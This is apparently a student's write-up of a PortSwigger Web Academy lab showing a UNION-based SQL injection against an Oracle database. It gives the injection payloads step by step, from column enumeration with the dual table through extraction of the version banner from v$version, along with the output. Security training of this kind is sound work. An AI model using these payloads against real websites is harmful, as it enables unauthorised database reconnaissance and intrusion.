# SQL Injection Attack - Querying Database Type and Version on Oracle

**Source:** PortSwigger Web Academy
**Category:** SQL Injection
**Technique:** UNION Attack
**Difficulty:** Practitioner
**Date:** April 2026

---

## Objective

Retrieve the database version string from an Oracle database
using a UNION-based SQL injection attack.

---

## Vulnerability

The category filter parameter in the GET request was vulnerable
to SQL injection. User input was passed directly into a SQL
query without sanitisation.

---

## Steps

### 1. Intercept the request

Captured the following request in Burp Suite Repeater:

```
GET /filter?category=Corporate+gifts
```

### 2. Enumerate columns

Oracle requires a FROM clause in every SELECT, so used the
built-in `dual` table to test:

```sql
' UNION SELECT NULL,NULL FROM dual--
```

Response returned normally — confirmed **2 columns**.

### 3. Identify string columns

```sql
' UNION SELECT 'a','a' FROM dual--
```

Response returned successfully — confirmed **both columns
accept strings**.

### 4. Extract version

Queried the `v$version` table which holds Oracle version info
in the `banner` column:

```sql
' UNION SELECT banner,NULL FROM v$version--
```

### 5. Result

```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
```

---

## Key Observations

- Oracle always requires `FROM` in SELECT — use `dual` for
  testing when no real table is needed
- `v$version` is an Oracle system table that exposes version info
- Both columns were strings so either could carry the output

---

## What I Learned

- Oracle syntax differs from MySQL/PostgreSQL for UNION attacks
- `dual` is a built-in dummy table in Oracle used for SELECT
  statements that don't need real data
- `v$version` and `banner` are Oracle-specific — different
  databases use different system tables

---

## Tools Used

- Burp Suite Repeater
- Manual payload crafting
